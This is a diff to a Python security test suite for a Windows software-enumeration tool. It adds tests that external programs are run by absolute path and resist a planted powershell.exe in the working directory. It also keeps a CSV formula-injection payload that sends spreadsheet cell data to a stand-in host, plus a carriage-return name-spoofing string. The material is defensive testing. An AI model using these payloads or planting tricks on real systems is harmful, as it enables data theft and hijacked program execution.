@@ -61,7 +61,7 @@ class TestOutputSanitization(unittest.TestCase):
         self.assertEqual(result, "Line1 Line2 Tabbed")
 
     def test_carriage_return_cannot_hide_text(self):
-        """A CR must not let a name overwrite itself on screen (SEC-2)."""
+        """A CR must not let a name overwrite itself on screen."""
         result = se.sanitize_output("EvilRAT\rGoogle Chrome")
         self.assertNotIn("\r", result)
         self.assertEqual(result, "EvilRAT Google Chrome")
@@ -1143,7 +1143,7 @@ class TestCsvSanitizationConsistency(unittest.TestCase):
 
 
 class TestDiffExportSanitization(unittest.TestCase):
-    """Baseline diff output (table, JSON, CSV) must sanitize every field (SEC-2).
+    """Baseline diff output (table, JSON, CSV) must sanitize every field.
 
     Removed entries and metadata come from a baseline file on disk, so they are untrusted.
     """
@@ -1197,7 +1197,7 @@ class TestDiffExportSanitization(unittest.TestCase):
 
 
 class TestCsvFormulaInjection(unittest.TestCase):
-    """CSV exports must not carry cells that spreadsheet apps run as formulas (SEC-5)."""
+    """CSV exports must not carry cells that spreadsheet apps run as formulas."""
 
     PAYLOADS = [
         '=HYPERLINK("http://x.invalid/?"&A1,"Click")',
@@ -1308,7 +1308,7 @@ class _FakeRegistry:
 
 
 class TestRegistryMalformedValues(unittest.TestCase):
-    """A malformed registry value must not hide software or abort the scan (SEC-1).
+    """A malformed registry value must not hide software or abort the scan.
 
     Any process can write under HKCU, so a REG_DWORD InstallDate used to make the whole
     registry source return nothing.
@@ -1377,7 +1377,7 @@ class TestRegistryMalformedValues(unittest.TestCase):
 
 
 class TestBrowserMalformedInput(unittest.TestCase):
-    """Malformed browser files must not crash the extension scan (SEC-1)."""
+    """Malformed browser files must not crash the extension scan."""
 
     def setUp(self):
         self.tmp = tempfile.TemporaryDirectory()
@@ -1474,6 +1474,108 @@ class TestBrowserMalformedInput(unittest.TestCase):
         self.assertEqual(self._firefox([1, 2]), [])
         self.assertEqual(self._firefox({"addons": "nope"}), [])
         self.assertEqual(self._firefox("[" * 100000 + "]" * 100000), [])
+
+
+class TestExecutableResolution(unittest.TestCase):
+    """External programs are launched by absolute path, never by bare name."""
+
+    def _ok_result(self, stdout=""):
+        result = MagicMock()
+        result.stdout, result.returncode = stdout, 0
+        return result
+
+    def test_system_dir_comes_from_os_not_environment(self):
+        real = se._system_dir()
+        with patch.dict(os.environ, {"SystemRoot": r"C:\Planted", "windir": r"C:\Planted"}):
+            self.assertEqual(se._system_dir(), real)
+        self.assertTrue((real / "kernel32.dll").is_file())
+
+    def test_powershell_path_is_absolute_in_system_dir(self):
+        ps = se._powershell_path()
+        self.assertTrue(ps.is_absolute())
+        self.assertEqual(ps.parent.parent.parent, se._system_dir())
+        self.assertEqual(ps.name.lower(), "powershell.exe")
+
+    def test_store_scanner_runs_absolute_powershell(self):
+        with patch("subprocess.run", return_value=self._ok_result('"Name"\n')) as run:
+            se.StoreAppScanner().get_store_apps()
+        cmd = run.call_args[0][0]
+        self.assertEqual(cmd[0], str(se._powershell_path()))
+
+    def test_winget_path_comes_from_localappdata(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            alias = Path(tmp) / "Microsoft" / "WindowsApps" / "winget.exe"
+            alias.parent.mkdir(parents=True)
+            alias.write_bytes(b"")
+            with patch.dict(os.environ, {"LOCALAPPDATA": tmp}):
+                self.assertEqual(se._winget_path(), alias)
+
+    def test_winget_runs_absolute_path(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            fake = Path(tmp) / "winget.exe"
+            fake.write_bytes(b"")
+            with patch.object(se, "_winget_path", return_value=fake), \
+                 patch("subprocess.run", return_value=self._ok_result()) as run:
+                se.WingetUpdateChecker().check_for_updates()
+        self.assertEqual(run.call_args[0][0][0], str(fake))
+
+    def test_missing_winget_never_falls_back_to_bare_name(self):
+        captured = io.StringIO()
+        with patch.object(se, "_winget_path", return_value=None), \
+             patch("subprocess.run") as run, patch("sys.stderr", captured):
+            self.assertEqual(se.WingetUpdateChecker().check_for_updates(), [])
+        run.assert_not_called()
+        self.assertIn("winget not found", captured.getvalue())
+
+    def test_harden_environment_sets_flag_without_overriding(self):
+        with patch.dict(os.environ, {}, clear=False):
+            os.environ.pop("NoDefaultCurrentDirectoryInExePath", None)
+            se._harden_process_environment()
+            self.assertEqual(os.environ["NoDefaultCurrentDirectoryInExePath"], "1")
+            os.environ["NoDefaultCurrentDirectoryInExePath"] = "keep"
+            se._harden_process_environment()
+            self.assertEqual(os.environ["NoDefaultCurrentDirectoryInExePath"], "keep")
+
+    def test_main_hardens_environment_first(self):
+        with patch.object(se, "_harden_process_environment") as harden, \
+             patch.object(se, "WingetUpdateChecker") as checker, \
+             patch.object(sys, "argv", ["Software_Enumerator.py", "--check-updates", "--quiet"]), \
+             patch.object(se, "setup_logging"), patch.object(se, "_load_env_file"):
+            checker.return_value.check_for_updates.return_value = []
+            se.main()
+        harden.assert_called_once()
+
+    def test_planted_powershell_in_cwd_is_not_run(self):
+        """Integration: a copy of hostname.exe named powershell.exe in the CWD, with CWD search
+        enabled, must not be what the tool runs. Self-checking: skipped if planting can't work here."""
+        import shutil
+        hostname_exe = se._system_dir() / "hostname.exe"
+        if not hostname_exe.is_file():
+            self.skipTest("hostname.exe not available")
+        repo_dir = str(Path(se.__file__).resolve().parent)
+        probe = (
+            "import subprocess, sys\n"
+            f"sys.path.insert(0, {repo_dir!r})\n"
+            "import Software_Enumerator as se\n"
+            "args = ['-NoProfile', '-Command', 'echo REAL']\n"
+            "bare = subprocess.run(['powershell'] + args, capture_output=True, text=True).stdout.strip()\n"
+            "fixed = subprocess.run([str(se._powershell_path())] + args, capture_output=True, text=True).stdout.strip()\n"
+            "print(repr(bare)); print(repr(fixed))\n"
+        )
+        env = {k: v for k, v in os.environ.items() if k.lower() != "nodefaultcurrentdirectoryinexepath"}
+        with tempfile.TemporaryDirectory() as tmp:
+            shutil.copy(hostname_exe, Path(tmp) / "powershell.exe")
+            out = subprocess_run_text([sys.executable, "-c", probe], cwd=tmp, env=env)
+        import ast  # literal_eval, not eval: the output includes what a planted binary printed
+        bare, fixed = [ast.literal_eval(line) for line in out.splitlines()[-2:]]
+        if bare == "REAL":
+            self.skipTest("current-directory search is not active in this environment")
+        self.assertEqual(fixed, "REAL", "absolute path must run the real PowerShell")
+
+
+def subprocess_run_text(cmd, **kwargs):
+    import subprocess
+    return subprocess.run(cmd, capture_output=True, text=True, timeout=60, **kwargs).stdout
 
 
 class TestCompiledSkipPatterns(unittest.TestCase):
@@ -1815,6 +1917,7 @@ class SecurityTestSuite(unittest.TestSuite):
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCsvFormulaInjection))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestRegistryMalformedValues))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestBrowserMalformedInput))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestExecutableResolution))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCompiledSkipPatterns))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestLoadEnvFile))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestWingetUpdateChecker))
